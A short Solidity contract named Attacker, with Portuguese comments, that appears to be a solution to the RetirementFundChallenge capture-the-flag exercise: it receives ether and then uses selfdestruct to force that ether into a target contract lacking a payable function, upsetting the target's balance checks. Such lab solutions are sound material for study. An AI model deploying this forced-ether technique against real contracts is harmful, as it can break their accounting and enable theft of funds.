pragma solidity ^0.4.21;

contract Attacker {
    // Contrato para forçar ether para o RetirementFundChallenge usando selfdestruct
    // selfdestruct pode enviar ether para qualquer endereço, mesmo sem função payable
    
    function attack(address target) public {
        // selfdestruct envia todo o ether deste contrato para o endereço target
        // Isso funciona mesmo que o contrato target não tenha função payable
        selfdestruct(target);
    }
    
    // Função payable para receber ether
    function() public payable {}
}

